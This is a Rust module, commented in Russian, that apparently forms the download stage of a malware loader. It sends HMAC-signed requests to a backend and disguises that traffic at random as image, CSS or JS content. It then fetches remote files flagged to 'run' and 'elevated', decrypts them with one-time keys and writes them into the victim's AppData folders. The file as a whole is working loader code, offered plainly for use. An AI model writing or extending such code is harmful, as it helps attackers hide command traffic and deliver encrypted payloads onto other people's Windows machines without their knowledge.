use anyhow::{Result, Context};
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::{SystemTime, UNIX_EPOCH};
use sha2::{Sha256, Digest};
use std::path::Path;
use tokio::fs::{self, File};
use tokio::io::AsyncWriteExt;
use rand::{distributions::Alphanumeric, Rng};
use hex;
use crate::obfuscation::{ObfuscationFormat, encode_as_image, decode_from_image, encode_as_css, decode_from_css, encode_as_js, decode_from_js};

#[derive(Serialize)]
struct ApiRequest<'a> {
    profile: &'a str,
    timestamp: u64,
    nonce: String,
    signature: String,
}

#[derive(Deserialize, Debug)]
pub struct ApiResponse {
    pub success: bool,
    pub files: Option<Vec<RemoteFile>>,
    pub error: Option<String>,
}

#[derive(Deserialize, Debug, Clone)]
pub struct RemoteFile {
    pub name: String,
    pub url: String,
    pub sha256: String,
    pub target: String,
    pub run: bool,
    pub elevated: bool,
    pub key: Option<String>,      // одноразовый ключ дешифровки
    pub expires: Option<u64>,     // когда ключ протухает
}

// HMAC-SHA256 подпись запроса
fn generate_signature(secret: &str, profile: &str, timestamp: u64, nonce: &str) -> String {
    use hmac::{Hmac, Mac};
    type HmacSha256 = Hmac<Sha256>;

    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).expect("HMAC can take key of any size");
    let data = format!("{}{}{}", profile, timestamp, nonce);
    mac.update(data.as_bytes());

    hex::encode(mac.finalize().into_bytes())
}

// получаем список файлов с бэкенда
pub async fn fetch_metadata(api_url: &str, api_secret: &str, profile: &str) -> Result<Vec<RemoteFile>> {
    // формат обфускации выбираем рандомно
    let formats = [
        ObfuscationFormat::Image,
        ObfuscationFormat::CSS,
        ObfuscationFormat::JS,
    ];
    let format = formats[rand::random::<usize>() % formats.len()];

    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(15))
        .build()?;

    // timestamp + рандомный нонс
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
    let nonce: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();

    let signature = generate_signature(api_secret, profile, timestamp, &nonce);

    let req_data = ApiRequest {
        profile,
        timestamp,
        nonce,
        signature,
    };

    // сериализуем и кодируем в нужный формат
    let json = serde_json::to_string(&req_data)?;
    let body = match format {
        ObfuscationFormat::Image => encode_as_image(&json)?,
        ObfuscationFormat::CSS  => encode_as_css(&json)?,
        ObfuscationFormat::JS   => encode_as_js(&json)?,
        ObfuscationFormat::Json => json.into_bytes(),
    };

    let url = format!("{}?f={}", api_url, format.query_param());

    let response = client.post(&url)
        .header("Content-Type", format.content_type())
        .body(body)
        .send()
        .await
        .context("Failed to send API request")?;

    let response_bytes = response.bytes().await.context("Failed to read response")?;

    // декодируем ответ
    let json_response = match format {
        ObfuscationFormat::Image => decode_from_image(&response_bytes)?,
        ObfuscationFormat::CSS  => decode_from_css(&response_bytes)?,
        ObfuscationFormat::JS   => decode_from_js(&response_bytes)?,
        ObfuscationFormat::Json => String::from_utf8(response_bytes.to_vec())?,
    };

    let api_resp: ApiResponse = serde_json::from_str(&json_response)
        .context("Failed to parse API response JSON")?;

    if api_resp.success {
        Ok(api_resp.files.unwrap_or_default())
    } else {
        Err(anyhow::anyhow!("API Error: {}", api_resp.error.unwrap_or_else(|| "Unknown".into())))
    }
}

// раскрываем переменные окружения в пути
pub fn expand_env_vars(path: &str) -> String {
    let mut expanded = path.to_string();
    if path.contains("%APPDATA%") {
        let appdata = std::env::var("APPDATA").unwrap_or_default();
        expanded = expanded.replace("%APPDATA%", &appdata);
    }
    if path.contains("%LOCALAPPDATA%") {
        let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
        expanded = expanded.replace("%LOCALAPPDATA%", &localappdata);
    }
    expanded
}

// качаем файл, проверяем sha256, декриптуем если есть ключ, сохраняем
pub async fn download_file(file_info: &RemoteFile) -> Result<String> {
    let target_path = expand_env_vars(&file_info.target);
    let path = Path::new(&target_path);

    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).await?;
    }

    let client = Client::new();
    let mut response = client.get(&file_info.url).send().await?.error_for_status()?;

    let mut hasher = Sha256::new();
    let mut temp_data = Vec::new();

    while let Some(chunk) = response.chunk().await? {
        hasher.update(&chunk);
        temp_data.extend_from_slice(&chunk);
    }

    let hash_result = hex::encode(hasher.finalize());

    // sha256 проверяем по зашифрованным данным (то что лежит на сервере)
    if !file_info.sha256.is_empty() && file_info.sha256.to_lowercase() != hash_result.to_lowercase() {
        return Err(anyhow::anyhow!("Hash mismatch for {}. Expected: {}, Got: {}", file_info.name, file_info.sha256, hash_result));
    }

    // если есть ключ — декриптуем перед записью на диск
    let final_data = if let Some(ref key) = file_info.key {
        crate::encrypted_container::decrypt_container(&temp_data, key)?
    } else {
        temp_data
    };

    let mut file = File::create(&target_path).await?;
    file.write_all(&final_data).await?;

    Ok(target_path)
}
